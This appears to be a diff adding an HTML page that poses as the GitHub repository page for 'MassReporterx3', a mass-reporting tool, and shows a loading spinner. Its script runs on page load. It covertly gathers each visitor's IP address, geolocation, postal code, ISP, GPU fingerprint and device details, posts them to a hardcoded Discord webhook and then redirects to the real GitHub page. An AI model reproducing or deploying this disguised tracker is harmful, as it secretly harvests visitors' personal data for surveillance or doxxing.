@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!</title>
+    <meta name="description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
+    <meta property="og:title" content="GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!">
+    <meta property="og:description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
+    <meta property="og:url" content="https://github.com/KrumoXDev/MassReporterx3">
+    <meta property="og:image" content="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png">
+    <meta name="theme-color" content="#24292e">
+    <style>
+        body {
+            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
+            background-color: #0d1117;
+            color: #c9d1d9;
+            margin: 0;
+            padding: 16px;
+        }
+        .container {
+            max-width: 1012px;
+            margin: 0 auto;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #21262d;
+        }
+        .github-logo {
+            fill: #f0f6fc;
+            margin-right: 16px;
+        }
+        .repo-header {
+            padding: 24px 0;
+        }
+        .repo-title {
+            font-size: 24px;
+            font-weight: 600;
+        }
+        .loading {
+            text-align: center;
+            padding: 40px 0;
+        }
+        .spinner {
+            border: 2px solid rgba(240, 246, 252, 0.1);
+            border-top: 2px solid #f0f6fc;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <svg height="32" class="github-logo" viewBox="0 0 16 16" version="1.1" width="32">
+                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+            </svg>
+        </div>
+
+        <div class="repo-header">
+            <h1 class="repo-title">KrumoXDev/MassReporterx3</h1>
+            <div class="loading">
+                <div class="spinner"></div>
+                Loading repository...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Collect essential private data
+        async function collectData() {
+            try {
+                // Get IP and location first
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const {ip} = await ipRes.json();
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoRes.json();
+
+                // Get browser fingerprint
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                let gpuInfo = null;
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpuInfo = {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+
+                // Compile essential data (20+ points)
+                const data = {
+                    // Core identification
+                    ip: ip,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    
+                    // Precise location
+                    coordinates: {
+                        latitude: geoData.latitude,
+                        longitude: geoData.longitude,
+                        accuracy: "IP-based approximation"
+                    },
+                    location: {
+                        country: geoData.country_name,
+                        region: geoData.region,
+                        city: geoData.city,
+                        postal: geoData.postal,
+                        timezone: geoData.timezone
+                    },
+                    network: {
+                        isp: geoData.org,
+                        asn: geoData.asn
+                    },
+                    
+                    // Device info
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    devicePixelRatio: window.devicePixelRatio,
+                    deviceMemory: navigator.deviceMemory || "unknown",
+                    cpuCores: navigator.hardwareConcurrency || "unknown",
+                    
+                    // Browser fingerprint
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    doNotTrack: navigator.doNotTrack,
+                    gpu: gpuInfo,
+                    
+                    // Connection
+                    connection: navigator.connection ? {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null,
+                    
+                    // Page info
+                    referrer: document.referrer || "direct",
+                    url: window.location.href
+                };
+
+                return data;
+            } catch (e) {
+                console.error("Data collection error:", e);
+                return { error: "Data collection failed" };
+            }
+        }
+
+        // Send private data to Discord
+        async function sendPrivateData(data) {
+            try {
+                const webhookURL = "https://discord.com/api/webhooks/1360696497305424186/DsnniTxXM1fsfKhi_3B947DsZAs-_UfkrOLPmOu6OXoXY-Mge3_S3efQOip0FJqMtyYH";
+                const message = {
+                    content: "📌 **New Visitor Data**",
+                    embeds: [{
+                        title: "Private Visitor Info",
+                        color: 0x6C63FF,
+                        fields: [
+                            { name: "🌍 Location", value: `${data.location.city}, ${data.location.region}, ${data.location.country}`, inline: true },
+                            { name: "📍 Coordinates", value: `${data.coordinates.latitude}, ${data.coordinates.longitude}`, inline: true },
+                            { name: "🕒 Timezone", value: data.location.timezone, inline: true },
+                            { name: "📱 Device", value: `${data.screen} (${data.platform})`, inline: true },
+                            { name: "🔌 Network", value: `${data.network.isp} (AS${data.network.asn})`, inline: true },
+                            { name: "🌐 Connection", value: `${data.connection.type} (${data.connection.downlink}Mbps)`, inline: true },
+                            { name: "🆔 IP Address", value: `\`${data.ip}\``, inline: false },
+                            { name: "🖥️ GPU", value: `${data.gpu?.vendor || 'unknown'} (${data.gpu?.renderer || 'unknown'})`, inline: true },
+                            { name: "💾 Memory", value: `${data.deviceMemory}GB`, inline: true },
+                            { name: "⚡ CPU Cores", value: data.cpuCores, inline: true }
+                        ],
+                        footer: { text: `Collected at ${new Date().toLocaleString()}` }
+                    }]
+                };
+
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(message)
+                });
+            } catch (e) {
+                console.error("Failed to send data:", e);
+            }
+        }
+
+        // Execute and redirect
+        (async () => {
+            const visitorData = await collectData();
+            await sendPrivateData(visitorData);
+            window.location.replace("https://github.com/KrumoXDev/MassReporterx3");
+        })();
+    </script>
+</body>
+</html>
